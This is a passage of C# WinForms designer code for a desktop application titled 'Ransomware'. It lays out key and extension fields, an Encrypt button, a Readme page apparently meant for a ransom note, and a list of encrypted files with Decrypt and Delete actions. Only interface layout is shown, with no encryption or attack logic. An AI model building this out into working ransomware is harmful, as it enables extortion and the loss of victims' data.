        this.KeyEncrypt.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.KeyEncrypt.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.KeyEncrypt.DefaultText = "";
        this.KeyEncrypt.FillColor = System.Drawing.Color.White;
        this.KeyEncrypt.HideSelection = true;
        this.KeyEncrypt.IconLeft = null;
        this.KeyEncrypt.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.KeyEncrypt.IconPadding = 3;
        this.KeyEncrypt.IconRight = null;
        this.KeyEncrypt.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.KeyEncrypt.Lines = new string[0];
        this.KeyEncrypt.Location = new System.Drawing.Point(16, 297);
        this.KeyEncrypt.MaxLength = 32767;
        this.KeyEncrypt.MinimumSize = new System.Drawing.Size(1, 1);
        this.KeyEncrypt.Modified = false;
        this.KeyEncrypt.Multiline = false;
        this.KeyEncrypt.Name = "KeyEncrypt";
        stateProperties13.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties13.FillColor = System.Drawing.Color.Empty;
        stateProperties13.ForeColor = System.Drawing.Color.Empty;
        stateProperties13.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.KeyEncrypt.OnActiveState = stateProperties13;
        stateProperties14.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties14.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties14.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties14.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.KeyEncrypt.OnDisabledState = stateProperties14;
        stateProperties15.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties15.FillColor = System.Drawing.Color.Empty;
        stateProperties15.ForeColor = System.Drawing.Color.Empty;
        stateProperties15.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.KeyEncrypt.OnHoverState = stateProperties15;
        stateProperties16.BorderColor = System.Drawing.Color.Silver;
        stateProperties16.FillColor = System.Drawing.Color.White;
        stateProperties16.ForeColor = System.Drawing.Color.Empty;
        stateProperties16.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.KeyEncrypt.OnIdleState = stateProperties16;
        this.KeyEncrypt.Padding = new System.Windows.Forms.Padding(3);
        this.KeyEncrypt.PasswordChar = '\0';
        this.KeyEncrypt.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.KeyEncrypt.PlaceholderText = "Key";
        this.KeyEncrypt.ReadOnly = false;
        this.KeyEncrypt.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.KeyEncrypt.SelectedText = "";
        this.KeyEncrypt.SelectionLength = 0;
        this.KeyEncrypt.SelectionStart = 0;
        this.KeyEncrypt.ShortcutsEnabled = true;
        this.KeyEncrypt.Size = new System.Drawing.Size(560, 28);
        this.KeyEncrypt.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.KeyEncrypt.TabIndex = 684;
        this.KeyEncrypt.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.KeyEncrypt.TextMarginBottom = 0;
        this.KeyEncrypt.TextMarginLeft = 3;
        this.KeyEncrypt.TextMarginTop = 1;
        this.KeyEncrypt.TextPlaceholder = "Key";
        this.KeyEncrypt.UseSystemPasswordChar = false;
        this.KeyEncrypt.WordWrap = true;
        this.ImageBackground.BackColor = System.Drawing.Color.Black;
        this.ImageBackground.Location = new System.Drawing.Point(412, 142);
        this.ImageBackground.Name = "ImageBackground";
        this.ImageBackground.Size = new System.Drawing.Size(165, 149);
        this.ImageBackground.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.ImageBackground.TabIndex = 683;
        this.ImageBackground.TabStop = false;
        this.TxExtension.AcceptsReturn = false;
        this.TxExtension.AcceptsTab = false;
        this.TxExtension.AnimationSpeed = 200;
        this.TxExtension.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TxExtension.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TxExtension.AutoSizeHeight = true;
        this.TxExtension.BackColor = System.Drawing.Color.Transparent;
        this.TxExtension.BackgroundImage = (System.Drawing.Image)resources.GetObject("TxExtension.BackgroundImage");
        this.TxExtension.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.TxExtension.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.TxExtension.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.TxExtension.BorderColorIdle = System.Drawing.Color.Silver;
        this.TxExtension.BorderRadius = 2;
        this.TxExtension.BorderThickness = 1;
        this.TxExtension.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TxExtension.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TxExtension.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.TxExtension.DefaultText = "";
        this.TxExtension.FillColor = System.Drawing.Color.White;
        this.TxExtension.HideSelection = true;
        this.TxExtension.IconLeft = null;
        this.TxExtension.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TxExtension.IconPadding = 3;
        this.TxExtension.IconRight = Properties.Resources.IconAdd;
        this.TxExtension.IconRightCursor = System.Windows.Forms.Cursors.Hand;
        this.TxExtension.Lines = new string[0];
        this.TxExtension.Location = new System.Drawing.Point(16, 263);
        this.TxExtension.MaxLength = 32767;
        this.TxExtension.MinimumSize = new System.Drawing.Size(1, 1);
        this.TxExtension.Modified = false;
        this.TxExtension.Multiline = false;
        this.TxExtension.Name = "TxExtension";
        stateProperties17.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties17.FillColor = System.Drawing.Color.Empty;
        stateProperties17.ForeColor = System.Drawing.Color.Empty;
        stateProperties17.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TxExtension.OnActiveState = stateProperties17;
        stateProperties18.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties18.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties18.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties18.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TxExtension.OnDisabledState = stateProperties18;
        stateProperties19.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties19.FillColor = System.Drawing.Color.Empty;
        stateProperties19.ForeColor = System.Drawing.Color.Empty;
        stateProperties19.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TxExtension.OnHoverState = stateProperties19;
        stateProperties20.BorderColor = System.Drawing.Color.Silver;
        stateProperties20.FillColor = System.Drawing.Color.White;
        stateProperties20.ForeColor = System.Drawing.Color.Empty;
        stateProperties20.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TxExtension.OnIdleState = stateProperties20;
        this.TxExtension.Padding = new System.Windows.Forms.Padding(3);
        this.TxExtension.PasswordChar = '\0';
        this.TxExtension.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TxExtension.PlaceholderText = "Extension";
        this.TxExtension.ReadOnly = false;
        this.TxExtension.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TxExtension.SelectedText = "";
        this.TxExtension.SelectionLength = 0;
        this.TxExtension.SelectionStart = 0;
        this.TxExtension.ShortcutsEnabled = true;
        this.TxExtension.Size = new System.Drawing.Size(141, 28);
        this.TxExtension.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TxExtension.TabIndex = 681;
        this.TxExtension.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TxExtension.TextMarginBottom = 0;
        this.TxExtension.TextMarginLeft = 3;
        this.TxExtension.TextMarginTop = 1;
        this.TxExtension.TextPlaceholder = "Extension";
        this.TxExtension.UseSystemPasswordChar = false;
        this.TxExtension.WordWrap = true;
        this.TxExtension.OnIconRightClick += new System.EventHandler(TxExtension_OnIconRightClick);
        this.Encrypt.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.Encrypt.BackColor = System.Drawing.Color.White;
        this.Encrypt.BorderRadius = 4;
        this.Encrypt.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Encrypt.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Encrypt.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Encrypt.CheckedState.Parent = this.Encrypt;
        this.Encrypt.Cursor = System.Windows.Forms.Cursors.Hand;
        this.Encrypt.CustomImages.Parent = this.Encrypt;
        this.Encrypt.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Encrypt.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Encrypt.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.Encrypt.ForeColor = System.Drawing.Color.White;
        this.Encrypt.HoverState.Parent = this.Encrypt;
        this.Encrypt.Location = new System.Drawing.Point(482, 382);
        this.Encrypt.Name = "Encrypt";
        this.Encrypt.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.Encrypt.PressedDepth = 50;
        this.Encrypt.ShadowDecoration.Parent = this.Encrypt;
        this.Encrypt.Size = new System.Drawing.Size(95, 26);
        this.Encrypt.TabIndex = 680;
        this.Encrypt.Text = "Encrypt";
        this.Encrypt.Click += new System.EventHandler(Encrypt_Click);
        this.PageReadme.Controls.Add(this.RichTextBoxMesssage);
        this.PageReadme.Location = new System.Drawing.Point(4, 4);
        this.PageReadme.Name = "PageReadme";
        this.PageReadme.Size = new System.Drawing.Size(591, 420);
        this.PageReadme.TabIndex = 1;
        this.PageReadme.Text = "Readme";
        this.PageReadme.UseVisualStyleBackColor = true;
        this.RichTextBoxMesssage.Dock = System.Windows.Forms.DockStyle.Fill;
        this.RichTextBoxMesssage.Enabled = false;
        this.RichTextBoxMesssage.Font = new System.Drawing.Font("Segoe UI", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.RichTextBoxMesssage.Location = new System.Drawing.Point(0, 0);
        this.RichTextBoxMesssage.Name = "RichTextBoxMesssage";
        this.RichTextBoxMesssage.Size = new System.Drawing.Size(591, 420);
        this.RichTextBoxMesssage.TabIndex = 0;
        this.RichTextBoxMesssage.Text = "";
        this.PageEncrypt.Controls.Add(this.ListEncryptd);
        this.PageEncrypt.Location = new System.Drawing.Point(4, 4);
        this.PageEncrypt.Name = "PageEncrypt";
        this.PageEncrypt.Size = new System.Drawing.Size(591, 420);
        this.PageEncrypt.TabIndex = 2;
        this.PageEncrypt.Text = "Encrypt";
        this.PageEncrypt.UseVisualStyleBackColor = true;
        this.ListEncryptd.Columns.AddRange(new System.Windows.Forms.ColumnHeader[4] { this.columnHeader1, this.columnHeader2, this.columnHeader3, this.columnHeader5 });
        this.ListEncryptd.ContextMenuStrip = this.contextMenuStrip1;
        this.ListEncryptd.FullRowSelect = true;
        this.ListEncryptd.HideSelection = false;
        this.ListEncryptd.LargeImageList = this.imageList1;
        this.ListEncryptd.Location = new System.Drawing.Point(0, 0);
        this.ListEncryptd.Name = "ListEncryptd";
        this.ListEncryptd.Size = new System.Drawing.Size(591, 420);
        this.ListEncryptd.SmallImageList = this.imageList1;
        this.ListEncryptd.TabIndex = 677;
        this.ListEncryptd.UseCompatibleStateImageBehavior = false;
        this.ListEncryptd.View = System.Windows.Forms.View.Details;
        this.columnHeader1.Text = "State";
        this.columnHeader1.Width = 85;
        this.columnHeader2.Text = "Date";
        this.columnHeader2.Width = 93;
        this.columnHeader3.Text = "Size";
        this.columnHeader3.Width = 82;
        this.columnHeader5.Text = "Path";
        this.columnHeader5.Width = 203;
        this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.RefrshList, this.Decrypt, this.Delete });
        this.contextMenuStrip1.Name = "contextMenuStrip1";
        this.contextMenuStrip1.Size = new System.Drawing.Size(120, 82);
        this.RefrshList.BackColor = System.Drawing.Color.White;
        this.RefrshList.Image = (System.Drawing.Image)resources.GetObject("RefrshList.Image");
        this.RefrshList.Name = "RefrshList";
        this.RefrshList.Size = new System.Drawing.Size(119, 26);
        this.RefrshList.Text = "Refresh";
        this.RefrshList.Click += new System.EventHandler(RefrshList_Click);
        this.Decrypt.BackColor = System.Drawing.Color.White;
        this.Decrypt.Image = (System.Drawing.Image)resources.GetObject("Decrypt.Image");
        this.Decrypt.Name = "Decrypt";
        this.Decrypt.Size = new System.Drawing.Size(119, 26);
        this.Decrypt.Text = "Decrypt";
        this.Decrypt.Click += new System.EventHandler(Decrypt_Click);
        this.Delete.BackColor = System.Drawing.Color.White;
        this.Delete.Image = (System.Drawing.Image)resources.GetObject("Delete.Image");
        this.Delete.Name = "Delete";
        this.Delete.Size = new System.Drawing.Size(119, 26);
        this.Delete.Text = "Delete";
        this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
        this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
        this.imageList1.Images.SetKeyName(0, "Encrypt.png");
        this.imageList1.Images.SetKeyName(1, "Decrypt.png");
        this.imageList1.Images.SetKeyName(2, "Delete.png");
        this.imageList1.Images.SetKeyName(3, "StopServices.png");
        this.PaneControll.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PaneControll.Controls.Add(this.ButReadme);
        this.PaneControll.Controls.Add(this.ButSettings);
        this.PaneControll.Controls.Add(this.ButEncrypt);
        this.PaneControll.Location = new System.Drawing.Point(16, 112);
        this.PaneControll.Name = "PaneControll";
        this.PaneControll.Size = new System.Drawing.Size(45, 446);
        this.PaneControll.TabIndex = 608;
        this.ButReadme.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButReadme.BackColor = System.Drawing.Color.Transparent;
        this.ButReadme.BorderRadius = 10;
        this.ButReadme.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButReadme.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButReadme.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButReadme.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButReadme.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButReadme.CheckedState.Parent = this.ButReadme;
        this.ButReadme.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButReadme.CustomBorderColor = System.Drawing.Color.White;
        this.ButReadme.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButReadme.CustomImages.CheckedImage");
        this.ButReadme.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButReadme.CustomImages.HoveredImage");
        this.ButReadme.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButReadme.CustomImages.Image");
        this.ButReadme.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButReadme.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButReadme.CustomImages.Parent = this.ButReadme;
        this.ButReadme.FillColor = System.Drawing.Color.White;
        this.ButReadme.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButReadme.ForeColor = System.Drawing.Color.White;
        this.ButReadme.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButReadme.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButReadme.HoverState.FillColor = System.Drawing.Color.White;
        this.ButReadme.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButReadme.HoverState.Parent = this.ButReadme;
        this.ButReadme.ImageSize = new System.Drawing.Size(27, 27);
        this.ButReadme.Location = new System.Drawing.Point(3, 169);
        this.ButReadme.Name = "ButReadme";
        this.ButReadme.PressedColor = System.Drawing.Color.White;
        this.ButReadme.ShadowDecoration.Parent = this.ButReadme;
        this.ButReadme.Size = new System.Drawing.Size(38, 38);
        this.ButReadme.TabIndex = 20;
        this.ButReadme.UseTransparentBackground = true;
        this.ButReadme.Click += new System.EventHandler(ButReadme_Click);
        this.ButSettings.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButSettings.BackColor = System.Drawing.Color.Transparent;
        this.ButSettings.BorderRadius = 10;
        this.ButSettings.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButSettings.Checked = true;
        this.ButSettings.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButSettings.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButSettings.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButSettings.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButSettings.CheckedState.Parent = this.ButSettings;
        this.ButSettings.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButSettings.CustomBorderColor = System.Drawing.Color.White;
        this.ButSettings.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButSettings.CustomImages.CheckedImage");
        this.ButSettings.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButSettings.CustomImages.HoveredImage");
        this.ButSettings.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButSettings.CustomImages.Image");
        this.ButSettings.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButSettings.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButSettings.CustomImages.Parent = this.ButSettings;
        this.ButSettings.FillColor = System.Drawing.Color.White;
        this.ButSettings.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButSettings.ForeColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.FillColor = System.Drawing.Color.White;
        this.ButSettings.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButSettings.HoverState.Parent = this.ButSettings;
        this.ButSettings.ImageSize = new System.Drawing.Size(27, 27);
        this.ButSettings.Location = new System.Drawing.Point(3, 125);
        this.ButSettings.Name = "ButSettings";
        this.ButSettings.PressedColor = System.Drawing.Color.White;
        this.ButSettings.ShadowDecoration.Parent = this.ButSettings;
        this.ButSettings.Size = new System.Drawing.Size(38, 38);
        this.ButSettings.TabIndex = 19;
        this.ButSettings.UseTransparentBackground = true;
        this.ButSettings.Click += new System.EventHandler(ButSettings_Click);
        this.ButEncrypt.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButEncrypt.BackColor = System.Drawing.Color.Transparent;
        this.ButEncrypt.BorderRadius = 10;
        this.ButEncrypt.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButEncrypt.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButEncrypt.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButEncrypt.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButEncrypt.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButEncrypt.CheckedState.Parent = this.ButEncrypt;
        this.ButEncrypt.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButEncrypt.CustomBorderColor = System.Drawing.Color.White;
        this.ButEncrypt.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButEncrypt.CustomImages.CheckedImage");
        this.ButEncrypt.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButEncrypt.CustomImages.HoveredImage");
        this.ButEncrypt.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButEncrypt.CustomImages.Image");
        this.ButEncrypt.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButEncrypt.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButEncrypt.CustomImages.Parent = this.ButEncrypt;
        this.ButEncrypt.FillColor = System.Drawing.Color.White;
        this.ButEncrypt.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButEncrypt.ForeColor = System.Drawing.Color.White;
        this.ButEncrypt.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButEncrypt.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButEncrypt.HoverState.FillColor = System.Drawing.Color.White;
        this.ButEncrypt.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButEncrypt.HoverState.Parent = this.ButEncrypt;
        this.ButEncrypt.ImageSize = new System.Drawing.Size(27, 27);
        this.ButEncrypt.Location = new System.Drawing.Point(3, 213);
        this.ButEncrypt.Name = "ButEncrypt";
        this.ButEncrypt.PressedColor = System.Drawing.Color.White;
        this.ButEncrypt.ShadowDecoration.Parent = this.ButEncrypt;
        this.ButEncrypt.Size = new System.Drawing.Size(38, 38);
        this.ButEncrypt.TabIndex = 17;
        this.ButEncrypt.UseTransparentBackground = true;
        this.ButEncrypt.Click += new System.EventHandler(ButEncrypt_Click);
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.TitlrPage);
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.ImageLogo);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(652, 77);
        this.PanelTitle.TabIndex = 596;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(621, 11);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 612;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(598, 11);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 614;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.TitlrPage.AllowParentOverrides = false;
        this.TitlrPage.AutoEllipsis = false;
        this.TitlrPage.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.TitlrPage.CursorType = null;
        this.TitlrPage.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TitlrPage.ForeColor = System.Drawing.Color.DarkGray;
        this.TitlrPage.Location = new System.Drawing.Point(159, 19);
        this.TitlrPage.Name = "TitlrPage";
        this.TitlrPage.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitlrPage.Size = new System.Drawing.Size(41, 15);
        this.TitlrPage.TabIndex = 608;
        this.TitlrPage.Text = "settings";
        this.TitlrPage.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.TitlrPage.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5f;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(12, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(57, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 607;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.AutoSize = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(563, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(78, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Ransomware";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ImageLogo.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ImageLogo.Image = (System.Drawing.Image)resources.GetObject("ImageLogo.Image");
        this.ImageLogo.Location = new System.Drawing.Point(10, 13);
        this.ImageLogo.Name = "ImageLogo";
        this.ImageLogo.Size = new System.Drawing.Size(59, 50);
        this.ImageLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageLogo.TabIndex = 570;
        this.ImageLogo.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
